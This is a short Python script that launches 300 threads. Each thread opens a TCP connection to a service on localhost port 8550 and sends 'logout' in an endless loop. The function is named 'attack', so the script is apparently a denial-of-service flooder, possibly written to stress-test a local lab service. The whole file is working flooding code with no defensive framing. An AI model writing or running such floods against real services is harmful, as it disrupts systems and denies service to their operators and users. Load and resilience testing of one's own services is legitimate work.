import socket
import threading

target = '127.0.0.1'
port = 8550

attackers_num = 300


def attack():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target, port))
    while True:
        s.send("logout".encode('ascii'))


for i in range(attackers_num):
    thread = threading.Thread(target=attack)
    thread.start()
